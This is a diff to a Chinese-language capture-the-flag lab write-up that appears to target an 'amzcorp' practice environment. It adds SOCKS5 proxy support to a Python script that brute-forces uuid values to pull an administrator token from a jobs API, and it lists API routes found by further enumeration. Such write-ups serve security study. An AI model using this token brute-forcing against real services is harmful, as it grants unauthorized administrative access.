@@ -822,22 +822,41 @@ function GetToken() {
 
 那么就可以通过脚本，基于对 uuid 的爆破，来获取到管理员权限的 token 数据
 
+由于我本地环境使用 kali 上的 socks5 来访问环境，所以我的脚本添加了额外的对于代理的处理
+
 ```python
 import requests, base64, sys
 from pwn import log
+import urllib3
+
+# 禁用 InsecureRequestWarning 警告
+urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)
+
+
+# 设置 SOCKS5 代理
+proxies = {
+    "http": "socks5://127.0.0.1:10000",
+    "https": "socks5://127.0.0.1:10000",
+}
+hosts = {"jobs.amzcorp.local": "10.13.37.15"}
 
 bar = log.progress("uuid")
 
-target = "http://jobs.amzcorp.local/api/v4/tokens/get"
+hostname = "jobs.amzcorp.local"
 
-cookies = {"session": "..eJw1jk1OAzEMhe-SNUJObCdxV1yC9chxHFHR6UiZdoW4O0GI5fv0_r7CNqafH-HymE9_Cdu1h0tAydFtlJJbJmIxVqFaEIDdvaTahsbCxiXH5Jw5I1FCLW7C2p1rTGYIiMJE0K0lrmqKvZsg8-rnlFCctEUc6oWAsmYYEVChh3Xkefr8eyMZF7Bzju1xfPp9oaGApFxEspNh7QRNKmCuHhN7rVyoeYsr57tebyuiGhO-6asd-6LzuPmC72vkXPJ37K67__vC9w_pEE6Z.Ze8T2w.vs_ygNfhRDvZx0mH_ZEcQsXqkIg"}
-headers = {"Content-Type": "application/json"}
 
-for uuid in range(0,1000):
+target = f"http://{hosts[hostname]}/api/v4/tokens/get"
+
+cookies = {
+    "session": "......"
+}
+headers = {"Content-Type": "application/json", "Host": hostname}
+
+for uuid in range(0, 1000):
     data = '{"get_token":"True","uuid":"%d","username":"admin"}' % uuid
-    json = {"data": base64.b64encode(data.encode())}
+    json = {"data": base64.b64encode(data.encode()).decode()}
 
-    request = requests.post(target, headers=headers, cookies=cookies, json=json)
+    request = requests.post(target, headers=headers, cookies=cookies, json=json, proxies=proxies, verify=False)
     bar.status(uuid)
 
     if "Invalid" not in request.text:
@@ -846,7 +865,7 @@ for uuid in range(0,1000):
         sys.exit(0)
 ```
 
-得到
+大概在 `uuid: 990` 的时候，可以得到
 
 ```json
 {
@@ -858,3 +877,20 @@ for uuid in range(0,1000):
 ```
 
 ## Inspector
+
+对发现的Javascript脚本继续分析，得到以下路径
+
+```plaintext
+/api/v4/tokens/generate_token
+/api/v4/tokens/get
+/api/v4/logs/get_logs
+/api/v4/tokens/generate
+/api/v4/tokens/get
+/api/v4/logs/get
+```
+
+同时，经过爆破，还得到了这个路由
+
+```plaintext
+/api/v4/status
+```
